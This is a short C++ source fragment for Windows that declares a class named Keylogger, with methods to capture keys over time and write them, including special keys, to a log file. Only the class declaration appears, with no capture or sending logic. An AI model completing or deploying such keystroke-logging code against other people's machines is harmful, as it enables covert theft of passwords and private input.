#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <chrono>

using namespace std;

class Keylogger {
public:
    Keylogger(const string& filename) : logFilename(filename) {}

    void captureKey(int time);

private:
    string logFilename;

    void log(const string& input);

    bool logSpecialKey(int key);

    void logKey(char key) { log(string(1, key)); }
};